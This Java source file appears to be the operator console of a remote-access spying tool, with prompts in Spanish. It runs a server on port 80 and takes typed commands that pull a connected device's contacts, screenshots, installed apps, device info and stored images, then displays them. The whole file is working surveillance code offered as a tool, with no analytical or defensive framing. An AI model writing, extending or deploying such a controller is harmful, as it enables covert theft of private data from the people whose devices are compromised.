package main;

import java.util.ArrayList;
import java.util.Scanner;

import elements.Apps;
import elements.Contacts;
import elements.Images;
import elements.Screenshot;


public class Main {

	private static final int portnumber = 80;

	public static void main(String[] args){
		String cadena = "";
		Contacts contacts;
		Apps apps;
		Scanner sc = new Scanner(System.in);
		Server Server = new Server(portnumber);
		if(Server.Start()){
			while(!cadena.equals("0")){
				System.out.println("Introduce el comando que quieras ejecutar: ");
				cadena = sc.nextLine();
				switch(cadena) {
				case "contacts":
					contacts = new Contacts(Server.GetContact());
					if(contacts != null){
						System.out.println(contacts.toString());
					}
					break;
				case "screenshot":
					byte[] screenBytes = Server.GetScreenshot();
					if(screenBytes != null){
						Screenshot screen = new Screenshot(screenBytes);
						screen.show();
						//String path = "C:\\Users\\PAPA\\Desktop\\image.png";
						//path = path.replace("\\", "/");
						//screen.save(path);
					}
					break;
				case "apps":
					apps = new Apps(Server.GetAppsInstalled());
					if(apps != null){
						System.out.println(apps.toString());
					}
					break;
				case "info":
					String info = Server.getInfo();
					if(info != null){
						System.out.println(info);
					}
					break;
				case "images":
					ArrayList<byte[]> arrayImages = Server.getImages();
					if(arrayImages != null){
						Images images = new Images(arrayImages);
						images.show();
					}
				case "0":
					break;
				default:
					System.out.println("Comando no reconocido");
					break;
				}
			}
		}
		Server.close();
		System.exit(0);
	}

}
